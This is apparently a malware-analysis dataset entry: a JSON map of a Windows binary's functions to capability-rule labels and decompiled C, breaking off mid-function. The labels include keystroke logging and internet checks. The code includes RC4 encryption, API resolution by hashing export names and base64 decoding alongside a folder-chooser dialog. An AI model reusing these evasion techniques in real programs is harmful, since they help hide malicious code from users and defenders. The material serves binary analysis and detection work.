{
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00401520": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nvoid __cdecl fcn.00401520(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_bp_8h;\n    \n    if (arg_ch != 7) {\n        if (arg_ch < 8) {\n            if (arg_ch == 2) {\n                (*_sym.imp.USER32.dll_SetWindowLongA)(arg_8h, 0xfffffffc, *0x418060);\n            }\n            goto code_r0x00401556;\n        }\n        if (arg_ch == 0x101) {\n            (*_sym.imp.USER32.dll_EnableWindow)(*0x418030, 1);\n            goto code_r0x00401556;\n        }\n        if (arg_ch != 0x202) goto code_r0x00401556;\n    }\n    (*_sym.imp.USER32.dll_SendMessageA)(arg_8h, 0xb1, 0, 0xffffffff);\ncode_r0x00401556:\n    (*_sym.imp.USER32.dll_CallWindowProcA)(*0x418060, arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 276
    },
    "004015e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl fcn.004015e0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_220h;\n    uint var_11ch;\n    uint var_bp_ch;\n    \n    if (arg_ch == 2) {\n        (*_sym.imp.GDI32.dll_DeleteObject)(*0x418020);\n        (*_sym.imp.USER32.dll_SetWindowLongA)(arg_8h, 0xfffffffc, *0x418050);\n    }\n    else if (arg_ch == 0x202) {\n        (*_sym.imp.USER32.dll_GetWindowTextA)(*0x418040, &var_220h, 0x104);\n        sub.msvcrt.dll_sprintf(0x418080, \"%s\\\\%s\", 0x4181a0, &var_220h);\n        sub.msvcrt.dll_sprintf(&var_11ch, \"Create %s ?\", 0x418080);\n        iVar1 = (*_sym.imp.USER32.dll_MessageBoxA)(arg_8h, &var_11ch, \"CREATE\", 4);\n        if (iVar1 != 7) {\n            (*_sym.imp.KERNEL32.dll_CreateDirectoryA)(0x418080, 0);\n            (*_sym.imp.USER32.dll_EnableWindow)(*0x418030, 0);\n            *0x418064 = 1;\n            uVar2 = (*_sym.imp.USER32.dll_GetParent)(arg_8h);\n            uVar2 = (*_sym.imp.USER32.dll_FindWindowExA)(uVar2, 0, \"BUTTON\", 0x405019);\n            (*_sym.imp.USER32.dll_SendMessageA)(uVar2, 0xf5, 0, 0);\n        }\n    }\n    (*_sym.imp.USER32.dll_CallWindowProcA)(*0x418050, arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 459
    },
    "00401790": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401a25)\n// WARNING: Removing unreachable block (ram,0x00401a14)\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x00401a00)\n// WARNING: Removing unreachable block (ram,0x00401a12)\n// WARNING: Removing unreachable block (ram,0x004019f2)\n\nuint __cdecl fcn.00401790(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint var_28h;\n    int32_t var_1ch;\n    uint var_bp_ch;\n    \n    if (arg_ch != 1) {\n        if (arg_ch == 2) {\n            puVar4 = 0x4181a0;\n            for (iVar3 = 0x41; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            (*_sym.imp.SHELL32.DLL_SHGetPathFromIDListA)(arg_10h, 0x4181a0);\n            (*_sym.imp.USER32.dll_EnableWindow)(*0x418030, 0);\n        }\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_GetClientRect)(arg_8h, &var_28h);\n    *0x418030 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                          (0, \"BUTTON\", \"Create\", 0x50000000, 0xb, var_1ch + -0x24, 0x4b, 0x17, arg_8h, 0, *0x4182b0, 0)\n    ;\n    pcVar2 = _sym.imp.USER32.dll_SetWindowLongA;\n    *0x418050 = (*_sym.imp.USER32.dll_SetWindowLongA)(*0x418030, 0xfffffffc, fcn.004015e0);\n    *0x418020 = (*_sym.imp.GDI32.dll_CreateFontA)(0xc, 6, 0, 0, 400, 0, 0, 0, 0, 0, 0, 0, 0, \"MS Sans Serif\");\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    (*_sym.imp.USER32.dll_SendMessageA)(*0x418030, 0x30, *0x418020, 1);\n    *0x418040 = (*_sym.imp.USER32.dll_FindWindowExA)(arg_8h, 0, \"EDIT\", 0);\n    *0x418060 = (*pcVar2)(*0x418040, 0xfffffffc, fcn.00401520);\n    (*_sym.imp.KERNEL32.dll_GetCurrentDirectoryA)(0x104, 0x4181a0);\n    (*pcVar1)(arg_8h, 0x466, 1, 0x4181a0);\n    return 0;\n}\n",
        "token_count": 704
    },
    "00401a40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nuint __cdecl fcn.00401a40(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *var_2ch;\n    uint var_28h;\n    uint var_20h;\n    char *var_1ch;\n    uint var_18h;\n    code *var_14h;\n    uint var_8h;\n    \n    uVar1 = 0;\n    do {\n        *(&var_28h + uVar1) = 0;\n        uVar1 = uVar1 + 4;\n    } while (uVar1 < 0x20);\n    uVar3 = 0;\n    *0x4181a0 = 0;\n    var_20h = 0x4181a0;\n    var_1ch = \"Choose a Folder or Create a New One\";\n    var_28h = arg_8h;\n    var_18h = 0x11;\n    var_14h = fcn.00401790;\n    iVar2 = (*_sym.imp.SHELL32.DLL_SHBrowseForFolderA)(&var_28h);\n    if (iVar2 != 0) {\n        uVar3 = 1;\n        (*_sym.imp.SHELL32.DLL_SHGetPathFromIDListA)(iVar2, 0x4181a0);\n        (*_sym.imp.SHELL32.DLL_SHGetMalloc)(&var_2ch);\n        (**(*var_2ch + 0x14))(var_2ch, iVar2);\n        if (*0x418064 != '\\0') {\n            sub.msvcrt.dll_strcpy(0x4181a0, 0x418080);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 405
    },
    "00401c50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00401c50(uint *param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int32_t *piVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iStack48;\n    \n    piVar1 = param_1 + 2;\n    uVar9 = -((piVar1 & 0xf) >> 2) & 3;\n    *param_1 = 0;\n    param_1[1] = 0;\n    if (uVar9 == 0) {\n        iStack48 = 0x100;\n        iVar10 = 0;\n    }\n    else {\n        param_1[2] = 0;\n        if (uVar9 < 2) {\n            iStack48 = 0xff;\n            iVar10 = 1;\n        }\n        else {\n            param_1[3] = 1;\n            if (uVar9 < 3) {\n                iStack48 = 0xfe;\n                iVar10 = 2;\n            }\n            else {\n                param_1[4] = 2;\n                iVar10 = 3;\n                iStack48 = 0xfd;\n            }\n        }\n    }\n    iVar6 = *0x4172cc;\n    iVar5 = *0x4172c8;\n    iVar4 = *0x4172c4;\n    iVar3 = *0x4172c0;\n    uVar11 = 0x100 - uVar9;\n    uVar2 = uVar11 & 0xfffffffc;\n    iVar13 = iVar10 + 1;\n    iVar14 = iVar10 + 2;\n    iVar15 = iVar10 + 3;\n    piVar7 = param_1 + uVar9 + 2;\n    uVar9 = 0;\n    iVar12 = iVar10;\n    do {\n        uVar9 = uVar9 + 1;\n        *piVar7 = iVar12;\n        piVar7[1] = iVar13;\n        piVar7[2] = iVar14;\n        piVar7[3] = iVar15;\n        piVar7 = piVar7 + 4;\n        iVar12 = iVar12 + iVar3;\n        iVar13 = iVar13 + iVar4;\n        iVar14 = iVar14 + iVar5;\n        iVar15 = iVar15 + iVar6;\n    } while (uVar9 < uVar11 >> 2);\n    iVar10 = iVar10 + uVar2;\n    if (uVar2 != uVar11) {\n        piVar1[iVar10] = iVar10;\n        if (iStack48 - uVar2 != 1) {\n            piVar1[iVar10 + 1] = iVar10 + 1;\n            if (iStack48 - uVar2 != 2) {\n                piVar1[iVar10 + 2] = iVar10 + 2;\n            }\n        }\n    }\n    uVar9 = 0;\n    iVar10 = 0;\n    piVar7 = piVar1;\n    do {\n        iVar14 = *piVar7;\n        uVar9 = uVar9 + *(param_3 + iVar10) + iVar14 & 0xff;\n        iVar13 = iVar10 + 1;\n        iVar10 = iVar10 + 2;\n        if (iVar13 == param_2) {\n            iVar10 = 1;\n        }\n        *piVar7 = piVar1[uVar9];\n        if (iVar13 == param_2) {\n            iVar13 = 0;\n        }\n        piVar1[uVar9] = iVar14;\n        iVar14 = piVar7[1];\n        uVar9 = *(param_3 + iVar13) + iVar14 + uVar9 & 0xff;\n        iVar13 = iVar10 + 1;\n        if (param_2 == iVar10) {\n            iVar13 = 1;\n        }\n        piVar7[1] = piVar1[uVar9];\n        if (param_2 == iVar10) {\n            iVar10 = 0;\n        }\n        piVar1[uVar9] = iVar14;\n        iVar14 = piVar7[2];\n        uVar9 = *(param_3 + iVar10) + iVar14 + uVar9 & 0xff;\n        iVar10 = iVar13 + 1;\n        if (param_2 == iVar13) {\n            iVar10 = 1;\n        }\n        piVar7[2] = piVar1[uVar9];\n        if (param_2 == iVar13) {\n            iVar13 = 0;\n        }\n        piVar1[uVar9] = iVar14;\n        iVar14 = piVar7[3];\n        uVar9 = *(param_3 + iVar13) + iVar14 + uVar9 & 0xff;\n        if (param_2 == iVar10) {\n            iVar10 = 0;\n        }\n        piVar8 = piVar7 + 4;\n        piVar7[3] = piVar1[uVar9];\n        piVar1[uVar9] = iVar14;\n        piVar7 = piVar8;\n    } while (piVar8 != param_1 + 0x102);\n    return;\n}\n",
        "token_count": 1218
    },
    "00401ea0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid fcn.00401ea0(uint32_t *param_1, uint32_t param_2, uint8_t *param_3, uint8_t *param_4)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint8_t *puStack32;\n    uint8_t *puStack28;\n    uint32_t uStack24;\n    \n    uStack24 = param_2 >> 3;\n    uVar2 = *param_1;\n    uVar3 = param_1[1];\n    if (uStack24 != 0) {\n        puStack28 = param_4;\n        puStack32 = param_3;\n        do {\n            uVar4 = uVar2 + 1 & 0xff;\n            uVar2 = param_1[uVar4 + 2];\n            uVar5 = uVar3 + uVar2 & 0xff;\n            uVar3 = param_1[uVar5 + 2];\n            param_1[uVar4 + 2] = uVar3;\n            param_1[uVar5 + 2] = uVar2;\n            *puStack28 = param_1[(uVar3 + uVar2 & 0xff) + 2] ^ *puStack32;\n            uVar4 = uVar4 + 1 & 0xff;\n            uVar2 = param_1[uVar4 + 2];\n            uVar1 = uVar4 + 1 & 0xff;\n            uVar5 = uVar2 + uVar5 & 0xff;\n            uVar3 = param_1[uVar5 + 2];\n            param_1[uVar4 + 2] = uVar3;\n            param_1[uVar5 + 2] = uVar2;\n            uVar4 = uVar1 + 1 & 0xff;\n            puStack28[1] = param_1[(uVar2 + uVar3 & 0xff) + 2] ^ puStack32[1];\n            uVar2 = param_1[uVar1 + 2];\n            uVar5 = uVar2 + uVar5 & 0xff;\n            uVar3 = param_1[uVar5 + 2];\n            param_1[uVar1 + 2] = uVar3;\n            param_1[uVar5 + 2] = uVar2;\n            uVar1 = uVar4 + 1 & 0xff;\n            puStack28[2] = param_1[(uVar2 + uVar3 & 0xff) + 2] ^ puStack32[2];\n            uVar2 = param_1[uVar4 + 2];\n            uVar6 = uVar2 + uVar5 & 0xff;\n            uVar3 = param_1[uVar6 + 2];\n            param_1[uVar4 + 2] = uVar3;\n            param_1[uVar6 + 2] = uVar2;\n            uVar5 = uVar1 + 1 & 0xff;\n            puStack28[3] = param_1[(uVar2 + uVar3 & 0xff) + 2] ^ puStack32[3];\n            uVar2 = param_1[uVar1 + 2];\n            uVar4 = uVar2 + uVar6 & 0xff;\n            uVar3 = param_1[uVar4 + 2];\n            param_1[uVar1 + 2] = uVar3;\n            param_1[uVar4 + 2] = uVar2;\n            uVar1 = uVar5 + 1 & 0xff;\n            puStack28[4] = param_1[(uVar2 + uVar3 & 0xff) + 2] ^ puStack32[4];\n            uVar3 = param_1[uVar5 + 2];\n            uVar6 = uVar3 + uVar4 & 0xff;\n            uVar4 = param_1[uVar6 + 2];\n            param_1[uVar5 + 2] = uVar4;\n            param_1[uVar6 + 2] = uVar3;\n            uVar2 = uVar1 + 1 & 0xff;\n            puStack28[5] = param_1[(uVar3 + uVar4 & 0xff) + 2] ^ puStack32[5];\n            uVar3 = param_1[uVar1 + 2];\n            uVar5 = uVar3 + uVar6 & 0xff;\n            uVar4 = param_1[uVar5 + 2];\n            param_1[uVar1 + 2] = uVar4;\n            param_1[uVar5 + 2] = uVar3;\n            puStack28[6] = param_1[(uVar3 + uVar4 & 0xff) + 2] ^ puStack32[6];\n            uVar4 = param_1[uVar2 + 2];\n            uVar3 = uVar4 + uVar5 & 0xff;\n            uVar1 = param_1[uVar3 + 2];\n            param_1[uVar2 + 2] = uVar1;\n            param_1[uVar3 + 2] = uVar4;\n            puStack28[7] = param_1[(uVar4 + uVar1 & 0xff) + 2] ^ puStack32[7];\n            puStack32 = puStack32 + 8;\n            puStack28 = puStack28 + 8;\n            uStack24 = uStack24 - 1;\n        } while (uStack24 != 0);\n        param_3 = param_3 + (param_2 & 0xfffffff8);\n        param_4 = param_4 + (param_2 & 0xfffffff8);\n    }\n    param_2 = param_2 & 7;\n    if (param_2 != 0) {\n        uVar2 = uVar2 + 1 & 0xff;\n        uVar4 = param_1[uVar2 + 2];\n        uVar3 = uVar3 + uVar4 & 0xff;\n        uVar1 = param_1[uVar3 + 2];\n        param_1[uVar2 + 2] = uVar1;\n        param_1[uVar3 + 2] = uVar4;\n        *param_4 = param_1[(uVar4 + uVar1 & 0xff) + 2] ^ *param_3;\n        if (param_2 != 1) {\n            uVar2 = uVar2 + 1 & 0xff;\n            uVar4 = param_1[uVar2 + 2];\n            uVar3 = uVar3 + uVar4 & 0xff;\n            uVar1 = param_1[uVar3 + 2];\n            param_1[uVar2 + 2] = uVar1;\n            param_1[uVar3 + 2] = uVar4;\n            param_4[1] = param_1[(uVar4 + uVar1 & 0xff) + 2] ^ param_3[1];\n            if (param_2 != 2) {\n                uVar2 = uVar2 + 1 & 0xff;\n                uVar4 = param_1[uVar2 + 2];\n                uVar3 = uVar3 + uVar4 & 0xff;\n                uVar1 = param_1[uVar3 + 2];\n                param_1[uVar2 + 2] = uVar1;\n                param_1[uVar3 + 2] = uVar4;\n                param_4[2] = param_1[(uVar4 + uVar1 & 0xff) + 2] ^ param_3[2];\n                if (param_2 != 3) {\n                    uVar2 = uVar2 + 1 & 0xff;\n                    uVar4 = param_1[uVar2 + 2];\n                    uVar3 = uVar3 + uVar4 & 0xff;\n                    uVar1 = param_1[uVar3 + 2];\n                    param_1[uVar2 + 2] = uVar1;\n                    param_1[uVar3 + 2] = uVar4;\n                    param_4[3] = param_1[(uVar4 + uVar1 & 0xff) + 2] ^ param_3[3];\n                    if (param_2 != 4) {\n                        uVar2 = uVar2 + 1 & 0xff;\n                        uVar4 = param_1[uVar2 + 2];\n                        uVar3 = uVar3 + uVar4 & 0xff;\n                        uVar1 = param_1[uVar3 + 2];\n                        param_1[uVar2 + 2] = uVar1;\n                        param_1[uVar3 + 2] = uVar4;\n                        param_4[4] = param_1[(uVar4 + uVar1 & 0xff) + 2] ^ param_3[4];\n                        if (param_2 != 5) {\n                            uVar2 = uVar2 + 1 & 0xff;\n                            uVar4 = param_1[uVar2 + 2];\n                            uVar3 = uVar3 + uVar4 & 0xff;\n                            uVar1 = param_1[uVar3 + 2];\n                            param_1[uVar2 + 2] = uVar1;\n                            param_1[uVar3 + 2] = uVar4;\n                            param_4[5] = param_1[(uVar4 + uVar1 & 0xff) + 2] ^ param_3[5];\n                            if (param_2 != 6) {\n                                uVar2 = uVar2 + 1 & 0xff;\n                                uVar4 = param_1[uVar2 + 2];\n                                uVar3 = uVar3 + uVar4 & 0xff;\n                                uVar1 = param_1[uVar3 + 2];\n                                param_1[uVar2 + 2] = uVar1;\n                                param_1[uVar3 + 2] = uVar4;\n                                param_4[6] = param_1[(uVar4 + uVar1 & 0xff) + 2] ^ param_3[6];\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    *param_1 = uVar2;\n    param_1[1] = uVar3;\n    return;\n}\n",
        "token_count": 2343
    },
    "00402360": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00402360(uint32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    uint8_t *puVar6;\n    uint32_t uVar7;\n    int16_t *piVar8;\n    uint32_t uVar9;\n    int32_t iVar10;\n    uint32_t uVar11;\n    \n    iVar4 = fcn.00401b80(0x30);\n    if (*0x405090 != 0) {\n        piVar8 = 0x405090;\n        do {\n            piVar8 = piVar8 + 1;\n        } while (*piVar8 != 0);\n    }\n    piVar1 = *(*(iVar4 + 0xc) + 0xc);\n    piVar5 = piVar1;\n    do {\n        iVar4 = piVar5[6];\n        if (iVar4 == 0) {\n            return 0;\n        }\n        uVar11 = 0;\n        iVar10 = *(iVar4 + 0x78 + *(iVar4 + 0x3c)) + iVar4;\n        iVar2 = *(iVar10 + 0x1c);\n        iVar3 = *(iVar10 + 0x24);\n        if (*(iVar10 + 0x18) != 0) {\n            do {\n                puVar6 = fcn.00402240();\n                uVar7 = *puVar6;\n                if (uVar7 == 0) {\n                    if (param_1 == 0) goto code_r0x004024d8;\n                }\n                else {\n                    uVar9 = 0xffffffff;\n                    do {\n                        puVar6 = puVar6 + 1;\n                        uVar7 = uVar7 ^ uVar9;\n                        uVar9 = (uVar7 << 0x1f) >> 0x1f & 0x77073096U ^ (uVar7 << 0x1e) >> 0x1f & 0xee0e612cU ^\n                                uVar9 >> 8 ^ (uVar7 << 0x1d) >> 0x1f & 0x76dc419U ^ (uVar7 << 0x1c) >> 0x1f & 0xedb8832U\n                                ^ (uVar7 << 0x1b) >> 0x1f & 0x1db71064U ^ (uVar7 << 0x1a) >> 0x1f & 0x3b6e20c8U ^\n                                (uVar7 << 0x19) >> 0x1f & 0x76dc4190U ^ (uVar7 << 0x18) >> 0x1f & 0xedb88320U;\n                        uVar7 = *puVar6;\n                    } while (uVar7 != 0);\n                    if (param_1 == ~uVar9) {\ncode_r0x004024d8:\n                        return iVar4 + *(iVar4 + *(iVar4 + uVar11 * 2 + iVar3) * 4 + iVar2);\n                    }\n                }\n                uVar11 = uVar11 + 1;\n            } while (uVar11 <= *(iVar10 + 0x18) && *(iVar10 + 0x18) != uVar11);\n        }\n        piVar5 = *piVar5;\n        if (piVar5 == piVar1) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 796
    },
    "00402500": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint8_t * fcn.00402500(uint8_t *param_1, int32_t param_2, uint8_t **param_3)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    char cVar3;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint8_t *puVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    char acStack300 [16];\n    uint auStack284 [15];\n    uchar uStack223;\n    \n    puVar8 = auStack284;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0x80808080;\n        puVar8 = puVar8 + 1;\n    }\n    iVar5 = 0;\n    do {\n        *(auStack284 + \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"[iVar5]) = iVar5;\n        iVar5 = iVar5 + 1;\n    } while (iVar5 != 0x40);\n    uVar6 = 0;\n    uStack223 = 0;\n    puVar1 = param_1 + param_2;\n    puVar4 = param_1;\n    if (param_2 != 0) {\n        do {\n            if (*(auStack284 + *puVar4) != -0x80) {\n                uVar6 = uVar6 + 1;\n            }\n            puVar4 = puVar4 + 1;\n        } while (puVar4 != puVar1);\n        if (((uVar6 != 0) && ((uVar6 & 3) == 0)) && (puVar4 = sub.msvcrt.dll_malloc((uVar6 >> 2) * 3),  puVar4 != NULL))\n        {\n            iVar9 = 0;\n            iVar5 = 0;\n            puVar7 = puVar4;\n            do {\n                uVar2 = *param_1;\n                cVar3 = *(auStack284 + uVar2);\n                if (cVar3 != -0x80) {\n                    acStack300[iVar5] = cVar3;\n                    iVar5 = iVar5 + 1;\n                    iVar9 = iVar9 + (uVar2 == 0x3d);\n                    if (iVar5 == 4) {\n                        *puVar7 = acStack300[0] << 2 | acStack300[1] >> 4;\n                        puVar7[1] = acStack300[1] << 4 | acStack300[2] >> 2;\n                        puVar7[2] = acStack300[2] << 6 | acStack300[3];\n                        if (iVar9 != 0) {\n                            if (iVar9 == 1) {\n                                puVar7 = puVar7 + (2 - puVar4);\n                            }\n                            else {\n                                if (iVar9 != 2) {\n                                    sub.msvcrt.dll_free(puVar4);\n                                    return NULL;\n                                }\n                                puVar7 = puVar7 + (1 - puVar4);\n                            }\n                            goto code_r0x00402618;\n                        }\n                        iVar5 = 0;\n                        puVar7 = puVar7 + 3;\n                    }\n                }\n                param_1 = param_1 + 1;\n            } while (param_1 != puVar1);\n            puVar7 = puVar7 + -puVar4;\ncode_r0x00402618:\n            *param_3 = puVar7;\n            return puVar4;\n        }\n    }\n    return NULL;\n}\n",
        "token_count": 795
    },
    "00402b70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nuint __cdecl fcn.00402b70(uint32_t **arg_8h)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    code *pcVar3;\n    uint uVar4;\n    uint var_8h;\n    \n    uVar1 = **arg_8h;\n    if (uVar1 < 0xc0000092) {\n        if (0xc000008c < uVar1) {\ncode_r0x00402c30:\n            bVar2 = true;\ncode_r0x00402bf3:\n            pcVar3 = sub.msvcrt.dll_signal(8, 0);\n            if (pcVar3 == 0x1) {\n                sub.msvcrt.dll_signal(8, 1);\n                if (!bVar2) {\n                    return 0xffffffff;\n                }\n                fcn.00403310();\n                return 0xffffffff;\n            }\n            if (pcVar3 != NULL) {\n                (*pcVar3)(8);\n                return 0xffffffff;\n            }\n            goto code_r0x00402bdd;\n        }\n        if (uVar1 == 0xc0000005) {\n            pcVar3 = sub.msvcrt.dll_signal(0xb, 0);\n            if (pcVar3 == 0x1) {\n                sub.msvcrt.dll_signal(0xb, 1);\n                return 0xffffffff;\n            }\n            if (pcVar3 != NULL) {\n                (*pcVar3)(0xb);\n                return 0xffffffff;\n            }\n            goto code_r0x00402bdd;\n        }\n        if (uVar1 != 0xc000001d) goto code_r0x00402bdd;\n    }\n    else {\n        if (uVar1 == 0xc0000094) {\n            bVar2 = false;\n            goto code_r0x00402bf3;\n        }\n        if (uVar1 != 0xc0000096) {\n            if (uVar1 != 0xc0000093) goto code_r0x00402bdd;\n            goto code_r0x00402c30;\n        }\n    }\n    pcVar3 = sub.msvcrt.dll_signal(4, 0);\n    if (pcVar3 == 0x1) {\n        sub.msvcrt.dll_signal(4, 1);\n    }\n    else {\n        if (pcVar3 == NULL) {\ncode_r0x00402bdd:\n            if (*0x4182e4 != NULL) {\n    // WARNING: Could not recover jumptable at 0x00402bef. Too many branches\n    // WARNING: Treating indirect jump as call\n                uVar4 = (**0x4182e4)();\n                return uVar4;\n            }\n            return 0;\n        }\n        (*pcVar3)(4);\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 630
    },
    "00403030": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00403203)\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.00403030(void)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint32_t uVar9;\n    int32_t *piVar10;\n    int32_t *piVar11;\n    int32_t *piVar12;\n    int32_t *piVar13;\n    char **ppcVar14;\n    uint uStack96;\n    char *pcStack92;\n    uint32_t auStack88 [6];\n    uint *var_3ch;\n    uint var_38h;\n    int32_t lpAddress;\n    int32_t var_28h;\n    uint var_ch;\n    \n    if (*0x4182ec != 0) {\n        return;\n    }\n    *0x4182ec = 1;\n    uStack96 = 0x403058;\n    fcn.004038c0();\n    uStack96 = 0x40306a;\n    iVar5 = fcn.00403a90();\n    *0x4182f0 = 0;\n    iVar5 = -iVar5;\n    ppcVar14 = &stack0xffffffa4 + iVar5;\n    piVar13 = &stack0xffffffa4 + iVar5;\n    *0x4182f4 = &fcn.00403030::var_3ch + iVar5 + 3 & 0xfffffff0;\n    if ((*0x417784 == 0) && (*0x417788 == 0)) {\n        piVar10 = 0x417790;\n        if (*0x41778c == 0) {\n            piVar6 = piVar10;\n            if ((*0x417790 != 0) || (piVar6 = 0x417790,  *0x417794 != 0)) goto code_r0x0040313e;\n        }\n        else {\n            piVar10 = 0x417784;\n        }\n        pcVar8 = piVar10[2];\n        if (pcVar8 != 0x1) {\ncode_r0x004032f3:\n            ppcVar14[1] = pcVar8;\n            *ppcVar14 = \"  Unknown pseudo relocation protocol version %d.\\n\";\n            ppcVar14[-1] = 0x403303;\n            fcn.00402d90();\n            return;\n        }\n        piVar10 = piVar10 + 3;\n        if (0x41779b < piVar10) {\n            *0x4182f0 = 0;\n            return;\n        }\n        do {\n            iVar7 = *piVar10;\n            iVar3 = *(iVar7 + 0x400000);\n            piVar6 = piVar10[1] + 0x400000;\n            var_3ch = iVar3;\n            uVar9 = *(piVar10 + 2);\n            if (uVar9 == 0x10) {\n                uVar2 = *(piVar10[1] + 0x400000);\n                uVar9 = uVar2;\n                if (uVar2 < 0) {\n                    uVar9 = uVar2 | 0xffff0000;\n                }\n                var_3ch = &fcn.00403030::lpAddress;\n                lpAddress = iVar3 + (uVar9 - iVar7) + -0x400000;\n                *(&stack0xffffffa0 + iVar5) = 0x40325d;\n                fcn.00402df0();\n            }\n            else if (uVar9 == 0x20) {\n                var_3ch = &fcn.00403030::lpAddress;\n                lpAddress = (iVar3 - (iVar7 + 0x400000)) + *piVar6;\n                *(&stack0xffffffa0 + iVar5) = 0x4032cc;\n                fcn.00402df0();\n            }\n            else {\n                if (uVar9 != 8) {\n                    *(&stack0xffffffa8 + iVar5) = uVar9;\n                    *(&stack0xffffffa4 + iVar5) = \"  Unknown pseudo relocation bit size %d.\\n\";\n                    lpAddress = 0;\n                    *(&stack0xffffffa0 + iVar5) = 0x403131;\n                    fcn.00402d90();\n                    return;\n                }\n                uVar1 = *piVar6;\n                uVar9 = uVar1;\n                if (uVar1 < '\\0') {\n                    uVar9 = uVar1 | 